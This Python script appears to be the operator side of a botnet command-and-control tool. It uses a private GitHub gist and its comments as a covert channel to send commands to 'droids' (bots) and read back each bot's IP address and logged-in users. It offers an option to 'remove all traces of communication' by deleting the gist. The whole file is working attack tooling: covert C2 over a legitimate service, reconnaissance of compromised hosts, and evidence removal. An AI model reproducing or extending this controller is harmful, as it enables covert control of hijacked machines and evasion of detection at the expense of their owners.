import sys
import requests
import json
import time
from datetime import datetime


class Git:

    def __init__(self, github_gist_api, api_token):
        self.GITHUB_GIST_API = github_gist_api
        self.API_TOKEN = api_token
        self.gist_id = ""

    def create_gist(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'scope': 'gist'}
        payload = {"description": "GIST created by python code",
                   "public": False,
                   "files": {gist_name: {"content": "Hello droids!"}}}

        res = requests.post(self.GITHUB_GIST_API, headers=headers, params=params, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to create gist. Statu code " + str(res.status_code))
            print(res.text)
            exit(2)

        self.gist_id = json.loads(res.text)['id']

    def get_and_set_gist_id(self, gist_name):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}

        res = requests.get(self.GITHUB_GIST_API, headers=headers, params=params)

        if res.status_code != 200:
            print("Unable to get all gists. Statu code " + str(res.status_code))
            print(res.text)

        last_updated = ""
        for gist in json.loads(res.text):
            if gist_name in gist['files'].keys():
                if last_updated == "" or gist['updated_at'] > last_updated:
                    last_updated = gist['updated_at']
                    self.gist_id = gist['id']
        if self.gist_id == "":
            print("Unable to find gist " + gist_name + ".")
            exit(2)
        print("Using gist with id: " + self.gist_id)

    def add_comment_to_gist(self, content):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        payload = {"body": content}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.post(url, headers=headers, data=json.dumps(payload))
        if res.status_code != 201:
            print("Unable to add comment to gist. Statu code " + str(res.status_code))
            print(res.text)

    def get_gist_comments(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id + "/comments"

        res = requests.get(url, headers=headers, params=params)
        if res.status_code != 200:
            print("Unable to get gist's comments " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)

        return json.loads(res.text)

    def remove_gist(self):
        headers = {'Authorization': 'token %s' % self.API_TOKEN}
        params = {'Accept': 'application/vnd.github+json'}
        url = self.GITHUB_GIST_API + "/" + self.gist_id

        res = requests.delete(url, headers=headers, params=params)
        if res.status_code != 204:
            print("Unable to remove gist " + self.gist_id + ". Statu code " + str(res.status_code))
            print(res.text)


def wait_for_reasonable_time():
    time.sleep(10)


def request_logged_in_users(git):
    comment_text = "# Question\nDroids, who uses you right now?"
    git.add_comment_to_gist(comment_text)
    print("Gathering information...")
    wait_for_reasonable_time()
    related_comments = []
    for comment in git.get_gist_comments():
        if datetime.strptime(comment['updated_at'], date_format) >= last_comment_check \
                and comment['body'].startswith("> Droids, who uses you right now?"):
            related_comments.append(comment['body'])

    for comment in related_comments:
        lines = comment.splitlines()
        print("Bot on ip "+str(lines[2].split()[3])+" is used by:")
        for i in range(4, len(lines)):
            print(lines[i])


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
        exit(1)

    github_gist_api = "https://api.github.com/gists"
    api_token = sys.argv[1]
    gist_name = sys.argv[2]
    git_instance = Git(github_gist_api, api_token)
    date_format = "%Y-%m-%dT%H:%M:%SZ"

    git_instance.create_gist(gist_name)

    run = True
    art = "     ____________________________\n    !\_________________________/!\\\n    !!                         !! \\\n    !!  What a lovely day      !!  \\\n    !!  to use our loyal       !!  !\n    !!  droids, my lord.       !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  !\n    !!                         !!  /\n    !!_________________________!! /\n    !/_________________________\!/\n       __\_________________/__/!\n      !_______________________!/\n    ________________________\n   /oooo  oooo  oooo  oooo /!\n  /ooooooooooooooooooooooo/ /\n /ooooooooooooooooooooooo/ /\n/C=_____________________/_/\n"
    question = "\nWhat do you want me to order the droids, my lord?\n"
    options = "1 - Get users logged in to the droids\n" \
              "6 - Quit and remove all traces of communication\n"
    wrong_option_text = "I am so sorry to disagree with your order, my lord. " \
                        "But your answer must be a number from 1 to 6."
    print(art)
    while run:
        try:
            selected_option = int(input(question + options))
        except:
            print(wrong_option_text)
            continue
        last_comment_check = datetime.utcnow()
        if selected_option == 1:
            print("Excellent choice, my lord.")
            request_logged_in_users(git_instance)
        elif selected_option == 6:
            run = False
        else:
            print(wrong_option_text)
            continue
        question = "\nWhat do you want me to order the droids next, my lord?\n"
    git_instance.remove_gist()
